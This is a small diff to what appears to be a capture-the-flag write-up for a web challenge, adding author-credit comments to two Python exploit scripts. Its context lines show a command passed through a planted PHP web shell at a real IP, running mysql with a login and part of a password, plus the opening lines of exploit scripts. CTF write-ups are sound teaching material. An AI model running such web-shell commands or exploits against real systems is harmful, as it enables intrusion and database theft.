@@ -67,6 +67,7 @@ http://52.199.204.34/sandbox/___MD5___of___ip/fun.php?cmd=mysql -ufl4444g -pSugZ
 #### EXP
 
 ```python
+# by https://findneo.github.io/
 import requests as r
 import hashlib
 url = 'http://52.199.204.34/'
@@ -147,6 +148,7 @@ https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
 
 ```python
 #-*-coding:utf8-*-
+# by https://findneo.github.io/
 import requests as r
 from time import sleep
 import random
